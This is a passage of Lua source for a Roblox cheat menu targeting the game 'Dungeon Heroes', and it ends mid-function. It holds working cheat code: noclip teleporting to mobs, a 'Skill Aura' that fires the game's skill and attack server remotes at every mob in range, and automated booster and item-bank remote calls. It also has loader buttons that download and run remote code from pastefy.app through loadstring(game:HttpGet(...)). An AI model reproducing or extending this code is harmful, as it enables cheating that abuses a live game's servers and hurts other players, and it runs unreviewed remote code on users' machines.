MiscellaneousTab:CreateSection("Script Loaders")

MiscellaneousTab:CreateButton({
Name = "Follow Player",
Callback = function()
Rayfield:Notify({
Title = "Script By Sid",
Content = "Loading Follow Player...",
Duration = 2,
Image = 4483362458,
})

task.spawn(function()  
        local ok, err = pcall(function()  
            loadstring(game:HttpGet("https://pastefy.app/OZaP94pM/raw"))()  
        end)  

        if ok then  
            Rayfield:Notify({  
                Title = "Script By Sid",  
                Content = "Follow Player Loaded ✓",  
                Duration = 3,  
                Image = 4483362458,  
            })  
        else  
            warn("Follow Player Script Error:", err)  
        end  
    end)  
end,

})

MiscellaneousTab:CreateButton({
Name = "Emote V2",
Callback = function()
Rayfield:Notify({
Title = "Script By Sid",
Content = "Loading Emote V2...",
Duration = 2,
Image = 4483362458,
})

task.spawn(function()  
        local ok, err = pcall(function()  
            loadstring(game:HttpGet("https://pastefy.app/t7kwsYZn/raw"))()  
        end)  

        if ok then  
            Rayfield:Notify({  
                Title = "Script By Sid",  
                Content = "Emote V2 Loaded ✓",  
                Duration = 3,  
                Image = 4483362458,  
            })  
        else  
            warn("Emote V2 Script Error:", err)  
        end  
    end)  
end,

})

UtilityTab:CreateSection("Tween Mobs")

--========================================================
-- DUNGEON HEROES | AUTO MOBS + PET LOCK + AUTO NOCLIP V4
-- High-Speed Stable (200-1000+) | Zero Velocity Anti-Fling
-- Auto NoClip on Toggle | Upright Lock | Movable Platform
--========================================================

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local Player = Players.LocalPlayer

-- CONFIGURATION
local FloatHeight = 30
local MoveSpeed = 250

local PetOffset = Vector3.new(3, 2, 0)

local PlatformSize = Vector3.new(7, 1, 7)
local PlatformOffset = 3.5

local AutoMobs = false
local IsMovingToMob = false
local RunId = 0

local MovementConnection = nil
local NoClipConnection = nil
local SupportPlatform = nil
local OriginalCollideStates = {}

-- CHARACTER HELPERS
local function GetCharacter()
    return Player.Character
end

local function GetHRP()
    local Character = GetCharacter()
    return Character and Character:FindFirstChild("HumanoidRootPart")
end

-- AUTO NOCLIP MANAGEMENT
local function ApplyNoClipStep()
    local Character = GetCharacter()
    if not Character then return end

    for _, Part in ipairs(Character:GetDescendants()) do
        if Part:IsA("BasePart") then
            if OriginalCollideStates[Part] == nil then
                OriginalCollideStates[Part] = Part.CanCollide
            end
            Part.CanCollide = false
        end
    end
end

local function RestoreCharacterCollision()
    local Character = GetCharacter()
    if Character then
        for _, Part in ipairs(Character:GetDescendants()) do
            if Part:IsA("BasePart") then
                if OriginalCollideStates[Part] ~= nil then
                    Part.CanCollide = OriginalCollideStates[Part]
                elseif Part.Name == "HumanoidRootPart" or Part.Name == "Torso" or Part.Name == "UpperTorso" or Part.Name == "LowerTorso" then
                    Part.CanCollide = true
                end
            end
        end
    end
    table.clear(OriginalCollideStates)
end

-- EQUIPPED PET
local function GetMyPet()
    local MobsFolder = workspace:FindFirstChild("Mobs")
    if not MobsFolder then return nil end

    for _, Mob in ipairs(MobsFolder:GetChildren()) do
        if Mob:GetAttribute("Owner") == Player.Name then
            return Mob
        end
    end

    return nil
end

-- PET ROOT
local function GetPetRoot(Pet)
    if not Pet then return nil end

    if Pet:IsA("BasePart") then
        return Pet
    end

    if Pet:IsA("Model") then
        return Pet:FindFirstChild("HumanoidRootPart")
            or Pet.PrimaryPart
            or Pet:FindFirstChildWhichIsA("BasePart", true)
    end

    return nil
end

-- PET FOLLOW (ZERO VELOCITY STABILIZED)
local function LockPetToPlayer(Root)
    local Pet = GetMyPet()
    if not Pet or not Pet.Parent then return end

    local PetRoot = GetPetRoot(Pet)
    if not PetRoot then return end

    local TargetPosition = Root.CFrame:PointToWorldSpace(PetOffset)
    local Difference = TargetPosition - PetRoot.Position

    if Pet:IsA("Model") then
        Pet:PivotTo(Pet:GetPivot() + Difference)
    elseif Pet:IsA("BasePart") then
        Pet.CFrame = CFrame.new(TargetPosition) * Pet.CFrame.Rotation
    end

    PetRoot.AssemblyLinearVelocity = Vector3.zero
    PetRoot.AssemblyAngularVelocity = Vector3.zero
end

-- CREATE OR UPDATE PLATFORM
local function CreatePlatform(Root)
    if SupportPlatform and SupportPlatform.Parent then
        SupportPlatform.Anchored = true
        SupportPlatform.CanCollide = true
        SupportPlatform.AssemblyLinearVelocity = Vector3.zero
        SupportPlatform.AssemblyAngularVelocity = Vector3.zero

        SupportPlatform.CFrame = CFrame.new(
            Root.Position - Vector3.new(0, PlatformOffset, 0)
        )
        return
    end

    local Platform = Instance.new("Part")
    Platform.Name = "AutoMobs_SupportPlatform"
    Platform.Size = PlatformSize
    Platform.Anchored = true
    Platform.CanCollide = true
    Platform.CanTouch = false
    Platform.CanQuery = false

    Platform.Transparency = 0.35
    Platform.Material = Enum.Material.ForceField
    Platform.Color = Color3.fromRGB(130, 80, 255)

    Platform.CFrame = CFrame.new(
        Root.Position - Vector3.new(0, PlatformOffset, 0)
    )

    Platform.Parent = workspace
    SupportPlatform = Platform
end

-- RELEASE PLATFORM
local function ReleasePlatform()
    if SupportPlatform and SupportPlatform.Parent then
        SupportPlatform.Anchored = false
        SupportPlatform.CanCollide = true
    end
end

-- FIND NEAREST MOB IN ENTIRE DUNGEON
local function GetNearestMob()
    local Root = GetHRP()
    if not Root then return nil end

    local MobsFolder = workspace:FindFirstChild("Mobs")
    if not MobsFolder then return nil end

    local NearestMob = nil
    local ShortestDistance = math.huge

    for _, Mob in ipairs(MobsFolder:GetChildren()) do
        local Owner = Mob:GetAttribute("Owner")
        local HP = Mob:GetAttribute("HP")

        -- Ignore TargetDummy and owned pets
        if Mob.Name ~= "TargetDummy" and (Owner == nil or Owner == "") then
            local MobRoot = Mob:FindFirstChild("HumanoidRootPart") or Mob.PrimaryPart
            local ValidHP = (HP == nil) or (tonumber(HP) ~= nil and tonumber(HP) > 0)

            if MobRoot and ValidHP then
                local Distance = (MobRoot.Position - Root.Position).Magnitude
                if Distance < ShortestDistance then
                    ShortestDistance = Distance
                    NearestMob = Mob
                end
            end
        end
    end

    return NearestMob
end

-- STOP AUTO MOBS + DISABLE NOCLIP
local function StopAutoMobs()
    AutoMobs = false
    IsMovingToMob = false
    RunId += 1

    if MovementConnection then
        MovementConnection:Disconnect()
        MovementConnection = nil
    end

    if NoClipConnection then
        NoClipConnection:Disconnect()
        NoClipConnection = nil
    end

    RestoreCharacterCollision()

    local Root = GetHRP()
    if Root then
        Root.AssemblyLinearVelocity = Vector3.zero
        Root.AssemblyAngularVelocity = Vector3.zero
    end

    ReleasePlatform()
end

-- START AUTO MOBS + ENABLE AUTO NOCLIP
local function StartAutoMobs()
    StopAutoMobs()

    RunId += 1
    local CurrentRun = RunId

    AutoMobs = true

    -- 1. Stepped Connection for Instant Auto-NoClip (Prevents wall/pillar collision at 200-1000+ speed)
    NoClipConnection = RunService.Stepped:Connect(function()
        if not AutoMobs or RunId ~= CurrentRun then
            return
        end

        if IsMovingToMob then
            ApplyNoClipStep()
        end
    end)

    -- 2. Heartbeat Connection for Smooth High-Speed CFrame Movement & Velocity Lock
    MovementConnection = RunService.Heartbeat:Connect(function(DeltaTime)
        if not AutoMobs or RunId ~= CurrentRun then
            return
        end

        local StepTime = math.clamp(DeltaTime, 0.001, 0.1)

        pcall(function()
            local Character = GetCharacter()
            local Root = Character and Character:FindFirstChild("HumanoidRootPart")
            local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")

            if not Root or not Humanoid or Humanoid.Health <= 0 then
                IsMovingToMob = false
                return
            end

            -- Prevent tripping / ragdoll / falling states at high speeds
            if Humanoid.PlatformStand then
                Humanoid.PlatformStand = false
            end
            if Humanoid.Sit then
                Humanoid.Sit = false
            end

            -- SEARCH ENTIRE DUNGEON
            local Mob = GetNearestMob()

            -- NO VALID MOB ANYWHERE
            if not Mob then
                if IsMovingToMob then
                    IsMovingToMob = false
                    RestoreCharacterCollision()
                    Root.AssemblyLinearVelocity = Vector3.zero
                    Root.AssemblyAngularVelocity = Vector3.zero
                end
                ReleasePlatform()
                return
            end

            local MobRoot = Mob:FindFirstChild("HumanoidRootPart") or Mob.PrimaryPart
            if not MobRoot then
                IsMovingToMob = false
                ReleasePlatform()
                return
            end

            -- Active Mob Target Found -> Enable NoClip & Anti-Fling Physics Lock
            IsMovingToMob = true

            -- Kill all physics forces so character never flings or breaks joints
            Root.AssemblyLinearVelocity = Vector3.zero
            Root.AssemblyAngularVelocity = Vector3.zero

            -- CREATE OR RE-ANCHOR PLATFORM
            CreatePlatform(Root)

            -- TARGET POSITION ABOVE MOB
            local TargetPosition = MobRoot.Position + Vector3.new(0, FloatHeight, 0)
            local Difference = TargetPosition - Root.Position
            local Distance = Difference.Magnitude

            -- Keep character strictly upright (prevents tilting/spinning after bumping obstacles)
            local _, CurrentYaw, _ = Root.CFrame:ToEulerAnglesYXZ()
            local UprightRotation = CFrame.Angles(0, CurrentYaw, 0)

            if Distance > 0.05 then
                local Step = math.min(MoveSpeed * StepTime, Distance)
                local NewPosition = Root.Position + (Difference.Unit * Step)
                Root.CFrame = CFrame.new(NewPosition) * UprightRotation
            else
                Root.CFrame = CFrame.new(TargetPosition) * UprightRotation
            end

            -- PLATFORM LOCKED UNDER PLAYER
            if SupportPlatform and SupportPlatform.Parent then
                SupportPlatform.CFrame = CFrame.new(
                    Root.Position - Vector3.new(0, PlatformOffset, 0)
                )
            end

            -- PET FOLLOWS ONLY WHEN VALID MOB EXISTS
            LockPetToPlayer(Root)
        end)
    end)
end

-- MAIN TOGGLE
UtilityTab:CreateToggle({
    Name = "Auto Mobs",
    CurrentValue = false,
    Flag = "AutoMobsToggle",

    Callback = function(Value)
        if Value then
            StartAutoMobs()
        else
            StopAutoMobs()
        end
    end
})

-- FLOAT HEIGHT
UtilityTab:CreateSlider({
    Name = "Mob Float Height",
    Range = {10, 200},
    Increment = 1,
    Suffix = "Studs",
    CurrentValue = 30,
    Flag = "MobFloatHeight",

    Callback = function(Value)
        FloatHeight = Value
    end
})

-- MOVEMENT SPEED
UtilityTab:CreateSlider({
    Name = "Movement Speed",
    Range = {100, 1000},
    Increment = 25,
    Suffix = "Speed",
    CurrentValue = 250,
    Flag = "MovementSpeed",

    Callback = function(Value)
        MoveSpeed = Value
    end
})

-- RESPAWN CLEANUP
Player.CharacterAdded:Connect(function()
    table.clear(OriginalCollideStates)

    if SupportPlatform then
        SupportPlatform:Destroy()
        SupportPlatform = nil
    end

    -- If toggle is still ON after respawn, automatically re-attach after character loads
    if AutoMobs then
        task.wait(0.5)
        if AutoMobs then
            StartAutoMobs()
        end
    end
end)
                    
do
--====================================================
-- DUNGEON HEROES | 1-TOGGLE AUTO SKILL AURA (SLOTS 1-5)
-- Dynamically Reads Slots 1-4 + Slot 5 (Mastery Ultimate)
-- Works With All 180 Skills | No UI Notifications
--====================================================

local SkillAuraEnabled = false

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local Remotes = ReplicatedStorage:WaitForChild("Remotes")
local UseSkillRemote = Remotes:WaitForChild("UseSkill")
local PlayerSkillAttackRemote = Remotes:WaitForChild("PlayerSkillAttack")
local InterruptSkillRemote = Remotes:WaitForChild("InterruptSkill")
local UseUltimateRemote = Remotes:FindFirstChild("Masteries/UseUltimate")

local ProfileSystem = require(ReplicatedStorage.Systems.Profile)
local Items = require(ReplicatedStorage.Systems.Items)
local SkillsSystem = require(ReplicatedStorage.Systems.Skills)
local MasteriesSystem = require(ReplicatedStorage.Systems.Masteries)

-- Uses your existing CONFIG table if present, otherwise defaults
local SKILL_AURA_CONFIG = CONFIG or {
    KillRange = 200,
    AttackSpeed = 0.15
}

-- ==========================================
-- LIVE AUTO-DETECTION FOR SLOTS 1-4 & SLOT 5 (ULTIMATE)
-- ==========================================
local function GetAllActiveSkills()
    local ActiveSkills = {}
    local Seen = {}

    local function AddSkill(SkillId, IsUlt)
        if type(SkillId) == "string" and #SkillId > 0 and not Seen[SkillId] then
            Seen[SkillId] = true
            table.insert(ActiveSkills, {
                Name = SkillId,
                IsUltimate = IsUlt == true
            })
        end
    end

    -- 1. SLOTS 1 TO 4: Official Skills:GetSkillInActiveSlot(LocalPlayer, slot)
    for Slot = 1, 4 do
        local Ok, SkillName = pcall(function()
            return SkillsSystem:GetSkillInActiveSlot(LocalPlayer, Slot)
        end)
        if Ok and type(SkillName) == "string" and #SkillName > 0 then
            AddSkill(SkillName, false)
        end
    end

    -- 2. SLOTS 1 TO 4 FALLBACK: Read Profile.Equipped.Skill1..4 -> Items:GetItemData().Skill
    local Profile = nil
    pcall(function()
        Profile = ProfileSystem:GetProfile(LocalPlayer)
    end)

    if Profile and Profile:FindFirstChild("Equipped") then
        for Slot = 1, 4 do
            local SlotFolder = Profile.Equipped:FindFirstChild("Skill" .. tostring(Slot))
            if SlotFolder then
                for _, Child in ipairs(SlotFolder:GetChildren()) do
                    local OkData, ItemData = pcall(function()
                        return Items:GetItemData(Child.Name)
                    end)
                    if OkData and type(ItemData) == "table" and type(ItemData.Skill) == "string" then
                        AddSkill(ItemData.Skill, false)
                    end
                end
            end
        end
    end

    -- 3. SLOT 5 (MASTERY ULTIMATE): Read Masteries:GetEquippedUltimate(LocalPlayer).abilityId
    local UltAdded = false
    local OkUlt, UltTable = pcall(function()
        return MasteriesSystem:GetEquippedUltimate(LocalPlayer)
    end)

    if OkUlt and type(UltTable) == "table" and type(UltTable.abilityId) == "string" and #UltTable.abilityId > 0 then
        AddSkill(UltTable.abilityId, true)
        UltAdded = true
    end

    -- Fallback for Slot 5 via ActiveMastery string (e.g. "Guardian" -> "GuardianUltimate")
    if not UltAdded and Profile and Profile:FindFirstChild("Masteries") then
        local ActiveMastery = Profile.Masteries:FindFirstChild("ActiveMastery")
        if ActiveMastery and ActiveMastery:IsA("StringValue") and #ActiveMastery.Value > 0 then
            AddSkill(ActiveMastery.Value .. "Ultimate", true)
        end
    end

    return ActiveSkills
end

-- ==========================================
-- GET EXACT HIT COUNT FOR ANY SKILL
-- ==========================================
local function GetSkillHitsCount(SkillName)
    -- 1. Try Skills:GetSkillHitTable(LocalPlayer, SkillName) (Handles Necklace-Modified Hits)
    local OkHitTbl, HitTable = pcall(function()
        return SkillsSystem:GetSkillHitTable(LocalPlayer, SkillName)
    end)
    if OkHitTbl and type(HitTable) == "table" and #HitTable > 0 then
        return #HitTable
    end

    -- 2. Fallback to Skills:GetSkillData(SkillName).Hits
    local OkData, SkillData = pcall(function()
        return SkillsSystem:GetSkillData(SkillName)
    end)
    if OkData and type(SkillData) == "table" and type(SkillData.Hits) == "table" and #SkillData.Hits > 0 then
        return #SkillData.Hits
    end

    return 1
end

-- ==========================================
-- COLLECT TARGET MOBS IN RANGE
-- ==========================================
local function GetTargetsInRange()
    local Character = LocalPlayer.Character
    local HRP = Character and Character:FindFirstChild("HumanoidRootPart")
    local MobsFolder = workspace:FindFirstChild("Mobs")

    if not HRP or not MobsFolder then
        return {}
    end

    local Range = (CONFIG and CONFIG.KillRange) or SKILL_AURA_CONFIG.KillRange or 200
    local RealMobs = {}
    local DummyMobs = {}

    for _, Mob in ipairs(MobsFolder:GetChildren()) do
        local MobHRP = Mob:FindFirstChild("HumanoidRootPart")
        local HP = Mob:GetAttribute("HP")

        if MobHRP
            and HP ~= "0"
            and HP ~= 0
            and not Mob:GetAttribute("Owner")
            and (MobHRP.Position - HRP.Position).Magnitude <= Range then

            if Mob.Name == "TargetDummy" then
                table.insert(DummyMobs, Mob)
            else
                table.insert(RealMobs, Mob)
            end
        end
    end

    -- Prioritize real dungeon mobs; fallback to TargetDummy in lobby for testing
    local BaseMobs = (#RealMobs > 0) and RealMobs or DummyMobs
    if #BaseMobs == 0 then
        return {}
    end

    -- Build multi-target hit table (matches game's remote structure)
    local TargetTable = {}
    for _, Mob in ipairs(BaseMobs) do
        for _ = 1, 4 do
            table.insert(TargetTable, Mob)
        end
    end

    return TargetTable
end

-- ==========================================
-- MAIN SKILL AURA LOOP
-- ==========================================
local function StartSkillAura()
    task.spawn(function()
        while SkillAuraEnabled do
            task.wait()

            local EquippedSkills = GetAllActiveSkills()
            local InitialTargets = GetTargetsInRange()

            if #EquippedSkills > 0 and #InitialTargets > 0 then
                for _, SkillEntry in ipairs(EquippedSkills) do
                    if not SkillAuraEnabled then break end

                    local Targets = GetTargetsInRange()
                    if #Targets == 0 then break end

                    local SkillName = SkillEntry.Name
                    local HitCount = GetSkillHitsCount(SkillName)

                    -- 1. If Slot 5 (Ultimate), trigger Ultimate remote + UseSkill remote
                    if SkillEntry.IsUltimate and UseUltimateRemote then
                        pcall(function()
                            UseUltimateRemote:FireServer()
                        end)
                    end

                    -- 2. Activate Skill on Server (Opens RegisterSkillUseForHits window)
                    UseSkillRemote:FireServer(SkillName, 1)
                    task.wait(0.04)

                    -- 3. Fire PlayerSkillAttack for every hit index in the skill's Hits table
                    for HitIndex = 1, HitCount do
                        if not SkillAuraEnabled then break end
                        PlayerSkillAttackRemote:FireServer(Targets, SkillName, HitIndex)
                        if HitCount > 1 then
                            task.wait(0.02)
                        end
                    end

                    -- 4. Clear server "busy" cast state so the next skill slot can fire immediately
                    task.wait(0.03)
                    InterruptSkillRemote:FireServer()

                    local Speed = (CONFIG and CONFIG.AttackSpeed) or SKILL_AURA_CONFIG.AttackSpeed or 0.15
                    task.wait(Speed)
                end
            else
                task.wait(0.1)
            end
        end
    end)
end

-- ==========================================
-- SINGLE TOGGLE ON MAINTAB
-- ==========================================
UtilityTab:CreateToggle({
    Name = "Skill Aura",
    CurrentValue = false,
    Flag = "SkillAura",
    Callback = function(Value)
        SkillAuraEnabled = Value
        if Value then
            StartSkillAura()
        end
    end
})
end


UtilityTab:CreateSection("Auto Booster")

-- Dungeon Heroes | Auto Booster
-- Auto Refresh + Favorite Protection

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")

local Player = Players.LocalPlayer
local Items = require(RS.Systems.Items)

local ActivateBooster = RS:WaitForChild("Remotes"):WaitForChild("ActivateBooster")

local AutoEnabled = false
local WorkerId = 0
local SentCount = {}

-- Get Inventory
local function GetInventory()
return Items:GetPlayerItemFolder(Player, "Inventory")
end

-- Scan Boosters
local function ScanBoosters()
local Inventory = GetInventory()
if not Inventory then return end

for _, item in ipairs(Inventory:GetChildren()) do  
    if not AutoEnabled then break end  

    local success, err = pcall(function()  
        local itemData = Items:GetItemData(item.Name)  

        if not itemData or itemData.Category ~= "Booster" then  
            return  
        end  

        -- Favorite Protection  
        if Items:ItemIsFavorited(item) then  
            return  
        end  

        -- Get UID  
        local uid = Items:ItemRefForRemote(item)  

        if typeof(uid) ~= "string" or uid == "" then  
            return  
        end  

        -- Get Count  
        local countObject = item:FindFirstChild("Count")  
        local totalCount = countObject and countObject.Value or 1  

        local alreadySent = SentCount[uid] or 0  

        while alreadySent < totalCount and AutoEnabled do  
            if Items:ItemIsFavorited(item) then  
                break  
            end  

            ActivateBooster:FireServer(uid)  

            alreadySent += 1  
            SentCount[uid] = alreadySent  

            task.wait(0.5)  
        end  
    end)  

    if not success then  
        warn("[Auto Booster]", err)  
    end  
end

end

UtilityTab:CreateToggle({
Name = "Auto Activate Boosters",
CurrentValue = false,
Flag = "AutoBooster",

Callback = function(Value)  
    AutoEnabled = Value  
    WorkerId += 1  

    if Value then  
        local thisWorker = WorkerId  

        task.spawn(function()  
            while AutoEnabled and WorkerId == thisWorker do  
                ScanBoosters()  
                task.wait(1)  
            end  
        end)  
    end  
end

})


--====================================================
-- DUNGEON HEROES | PET LOCK ONLY
-- Separate Rayfield UI | One Toggle Only
-- Default Pet Position | Smooth Follow
--====================================================

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local Player = Players.LocalPlayer

local PetLockEnabled = false
local Connection = nil

-- DEFAULT FOLLOW POSITION
local PetOffset = Vector3.new(3, 2, 0)

-- GET EQUIPPED PET
local function GetMyPet()
    local Folder = workspace:FindFirstChild("Mobs")
    if not Folder then return nil end

    for _, Mob in ipairs(Folder:GetChildren()) do
        if Mob:GetAttribute("Owner") == Player.Name then
            return Mob
        end
    end

    return nil
end

-- GET PET ROOT
local function GetPetRoot(Pet)
    if not Pet then return nil end

    if Pet:IsA("BasePart") then
        return Pet
    end

    if Pet:IsA("Model") then
        return Pet:FindFirstChild("HumanoidRootPart")
            or Pet.PrimaryPart
            or Pet:FindFirstChildWhichIsA("BasePart", true)
    end

    return nil
end

-- SMOOTH PET FOLLOW
local function FollowPet(DeltaTime)
    local Character = Player.Character
    local PlayerRoot = Character
        and Character:FindFirstChild("HumanoidRootPart")

    if not PlayerRoot then return end

    local Pet = GetMyPet()
    if not Pet or not Pet.Parent then return end

    local PetRoot = GetPetRoot(Pet)
    if not PetRoot then return end

    local TargetPosition =
        PlayerRoot.CFrame:PointToWorldSpace(PetOffset)

    local CurrentPivot

    if Pet:IsA("Model") then
        CurrentPivot = Pet:GetPivot()
    else
        CurrentPivot = Pet.CFrame
    end

    local TargetPivot =
        CFrame.new(TargetPosition) * CurrentPivot.Rotation

    local Alpha = 1 - math.exp(-20 * DeltaTime)
    local NewPivot = CurrentPivot:Lerp(TargetPivot, Alpha)

    if Pet:IsA("Model") then
        Pet:PivotTo(NewPivot)
    else
        Pet.CFrame = NewPivot
    end
end

-- ONLY TOGGLE
MiscellaneousTab:CreateToggle({
    Name = "Pet Lock",
    CurrentValue = false,
    Flag = "PetLockOnly",

    Callback = function(Value)
        PetLockEnabled = Value

        if Connection then
            Connection:Disconnect()
            Connection = nil
        end

        if Value then
            Connection = RunService.Heartbeat:Connect(function(DeltaTime)
                if not PetLockEnabled then return end

                pcall(function()
                    FollowPet(DeltaTime)
                end)
            end)
        end
    end
})

-- RESPAWN CLEANUP
Player.CharacterAdded:Connect(function()
    if Connection then
        Connection:Disconnect()
        Connection = nil
    end

    PetLockEnabled = false
end)

UtilityTab:CreateSection("Ultimate Item Bank Manager")
do
    --====================================================
    -- DUNGEON HEROES | ULTIMATE ITEM BANK MANAGER (FIXED)
    -- Verified against Live Profile & Items Module Dump:
    -- * Uses Items:GetItemUid(Item) & Item:GetAttribute("ItemUid")
    -- * Reads both Instance Folders & Items:GetTableItems("ItemBank")
    -- * Custom 3-Second Top UI Notification (No Rayfield Notify)
    -- * Level Range (1-500), Rarities (1-9), Batch & Space Guard
    --====================================================

    local Players = game:GetService("Players")
    local RS = game:GetService("ReplicatedStorage")
    local TweenService = game:GetService("TweenService")
    local CoreGui = game:GetService("CoreGui")

    local Player = Players.LocalPlayer

    local Items = require(RS.Systems.Items)
    local ProfileSystem = require(RS.Systems.Profile)
    local ItemBankRemote = RS:WaitForChild("Remotes"):WaitForChild("ItemBankTransfer")

    -- ==========================================
    -- CUSTOM 3-SECOND TOP UI NOTIFICATION
    -- ==========================================
    local function ShowTopNotification(TitleText, SubText, AccentColor, Duration)
        task.spawn(function()
            pcall(function()
                local ParentGui = (gethui and gethui())
                    or CoreGui
                    or Player:WaitForChild("PlayerGui")

                local OldGui = ParentGui:FindFirstChild("DH_BankTopNotify")
                if OldGui then OldGui:Destroy() end

                local ScreenGui = Instance.new("ScreenGui")
                ScreenGui.Name = "DH_BankTopNotify"
                ScreenGui.IgnoreGuiInset = true
                ScreenGui.DisplayOrder = 999999
                ScreenGui.Parent = ParentGui

                local Frame = Instance.new("Frame")
                Frame.Size = UDim2.new(0, 380, 0, 60)
                Frame.Position = UDim2.new(0.5, -190, 0, -75)
                Frame.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
                Frame.BorderSizePixel = 0
                Frame.Parent = ScreenGui

                local Corner = Instance.new("UICorner")
                Corner.CornerRadius = UDim.new(0, 10)
                Corner.Parent = Frame

                local Stroke = Instance.new("UIStroke")
                Stroke.Color = AccentColor or Color3.fromRGB(0, 210, 130)
                Stroke.Thickness = 1.8
                Stroke.Parent = Frame

                local Title = Instance.new("TextLabel")
                Title.Size = UDim2.new(1, -16, 0, 22)
                Title.Position = UDim2.new(0, 8, 0, 6)
                Title.BackgroundTransparency = 1
                Title.Font = Enum.Font.GothamBold
                Title.TextSize = 14
                Title.TextColor3 = AccentColor or Color3.fromRGB(0, 255, 150)
                Title.TextXAlignment = Enum.TextXAlignment.Center
                Title.Text = tostring(TitleText)
                Title.Parent = Frame

                local Sub = Instance.new("TextLabel")
                Sub.Size = UDim2.new(1, -16, 0, 24)
                Sub.Position = UDim2.new(0, 8, 0, 29)
                Sub.BackgroundTransparency = 1
                Sub.Font = Enum.Font.GothamMedium
                Sub.TextSize = 12
                Sub.TextColor3 = Color3.fromRGB(225, 225, 225)
                Sub.TextXAlignment = Enum.TextXAlignment.Center
                Sub.Text = tostring(SubText)
                Sub.Parent = Frame

                TweenService:Create(
                    Frame,
                    TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
                    {Position = UDim2.new(0.5, -190, 0, 16)}
                ):Play()

                task.wait(Duration or 3)

                if Frame and Frame.Parent then
                    local Out = TweenService:Create(
                        Frame,
                        TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                        {Position = UDim2.new(0.5, -190, 0, -75)}
                    )
                    Out:Play()
                    Out.Completed:Wait()
                    if ScreenGui then ScreenGui:Destroy() end
                end
            end)
        end)
    end

    -- ==========================================
    -- SETTINGS & STATE VARIABLES
    -- ==========================================
    local AutoTransferEnabled = false
    local TransferDirection = "Inventory -> Bank"
    local TransferMode = "All Matching"
    local SortPriority = "Highest Level First"

    local ProtectFavorites = true
    local ProtectGearPresets = true
    local AutoStopOnLimit = true

    -- Batch & Space Limits
    local MaxTransferCount = 10 -- 0 = Unlimited
    local TransferCounter = 0
    local EnableSpaceGuard = true
    local MaxInventoryCap = 180

    -- Level Filter (Gear & Skills)
    local LevelFilterEnabled = false
    local MinLevelFilter = 1
    local MaxLevelFilter = 500

    -- Anti-Bounce & Delays
    local ScanDelay = 0.3
    local SingleTransferDelay = 0.10
    local UIDLockDuration = 3.0
    local RecentlyTransferred = {}

    -- Category Selection
    local SelectedCategory = "Gear (Weapon + Armor + Necklace)"
    local SelectedFilter = {kind = "gear_all"}

    -- All 9 Rarities
    local AllRaritiesEnabled = false
    local RarityConfig = {
        [1] = false, -- Common
        [2] = false, -- Uncommon
        [3] = false, -- Rare
        [4] = false, -- Epic
        [5] = false, -- Legendary
        [6] = false, -- Mythic
        [7] = false, -- Primordial
        [8] = false, -- Unique
        [9] = false, -- Nightmare
    }

    -- ==========================================
    -- DYNAMIC CATEGORY LIST BUILDER
    -- ==========================================
    local function IsExcludedCategory(Data)
        if type(Data) ~= "table" then return true end
        local Cat = tostring(Data.Category or "")
        -- Only exclude actual Cosmetic and Currency categories (Armor has Type="Shirt"/"Pants", so never exclude by Type!)
        if Cat == "Cosmetic" or Cat == "Currency" or Cat == "Title" or Cat == "Emote" or Cat == "" then
            return true
        end
        return false
    end

    local CategoryOptions = {
        "All Bankable Items",
        "Gear (Weapon + Armor + Necklace)",
        "Weapon Only",
        "Armor Only",
        "Necklace Only",
        "Skill Only",
        "Gear + Skills",
        "Pet Only",
        "Pet Token Only",
        "Refined Gem Only",
    }

    local FilterMap = {
        ["All Bankable Items"] = {kind = "all_bankable"},
        ["Gear (Weapon + Armor + Necklace)"] = {kind = "gear_all"},
        ["Weapon Only"] = {kind = "category", category = "Weapon"},
        ["Armor Only"] = {kind = "category", category = "Armor"},
        ["Necklace Only"] = {kind = "category", category = "Necklace"},
        ["Skill Only"] = {kind = "category", category = "Skill"},
        ["Gear + Skills"] = {kind = "gear_and_skill"},
        ["Pet Only"] = {kind = "category", category = "Pet"},
        ["Pet Token Only"] = {kind = "category", category = "Pet Token"},
        ["Refined Gem Only"] = {kind = "category", category = "Refined Gem"},
    }

    local KnownCategories = {
        ["Weapon"] = true,
        ["Armor"] = true,
        ["Necklace"] = true,
        ["Skill"] = true,
        ["Pet"] = true,
        ["Pet Token"] = true,
        ["Refined Gem"] = true,
    }

    local DynamicCategories = {}
    local ItemList = Items:GetItemList()

    for _, Data in pairs(ItemList) do
        if type(Data) == "table" and not IsExcludedCategory(Data) then
            local Cat = Data.Category
            if type(Cat) == "string" and not KnownCategories[Cat] then
                DynamicCategories[Cat] = true
            end
        end
    end

    local SortedDynamic = {}
    for Cat in pairs(DynamicCategories) do
        table.insert(SortedDynamic, Cat)
    end
    table.sort(SortedDynamic)

    for _, Cat in ipairs(SortedDynamic) do
        local Label = Cat .. " Only"
        FilterMap[Label] = {kind = "category", category = Cat}
        table.insert(CategoryOptions, Label)
    end

    -- ==========================================
    -- EXACT UID, INFO, LEVEL & PROTECTION HELPERS
    -- ==========================================

    local function GetItemUID(Item, FallbackKey)
        -- 1. Direct Attribute "ItemUid" (Verified from Profile.Inventory dump: [Attrs: ItemUid=3301f9])
        if typeof(Item) == "Instance" then
            local AttrUid = Item:GetAttribute("ItemUid")
                or Item:GetAttribute("Uid")
                or Item:GetAttribute("UID")
            if type(AttrUid) == "string" and #AttrUid > 0 then
                return AttrUid
            end
        end

        -- 2. Official Items:GetItemUid(Item)
        local s1, uid1 = pcall(function()
            return Items:GetItemUid(Item)
        end)
        if s1 and type(uid1) == "string" and #uid1 > 0 then
            return uid1
        end

        -- 3. Table Record UID fields (For Items:GetTableItems("ItemBank"))
        if type(Item) == "table" then
            local TblUid = Item.ItemUid or Item.uid or Item.UID or Item.Uid
            if type(TblUid) == "string" and #TblUid > 0 then
                return TblUid
            end
        end

        -- 4. Official Items:ItemRefForRemote(Item)
        local s2, ref = pcall(function()
            return Items:ItemRefForRemote(Item)
        end)
        if s2 and type(ref) == "string" and #ref > 0 then
            return ref
        end

        -- 5. Fallback dictionary key if valid hex/string UID
        if type(FallbackKey) == "string" and #FallbackKey > 0 then
            return FallbackKey
        end

        return nil
    end

    local function GetItemDetails(Item, FallbackKey)
